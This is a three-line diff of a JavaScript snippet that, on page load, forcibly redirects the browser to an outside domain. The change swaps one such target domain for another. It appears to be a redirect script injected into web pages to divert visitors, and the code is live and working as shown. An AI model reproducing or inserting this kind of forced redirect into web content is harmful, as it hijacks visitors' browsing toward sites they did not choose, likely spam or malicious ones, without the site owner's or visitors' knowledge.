@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://www.anquananquan.xyz/';
+    window['location'] = 'https://letis-kuailian.top/';
 })();
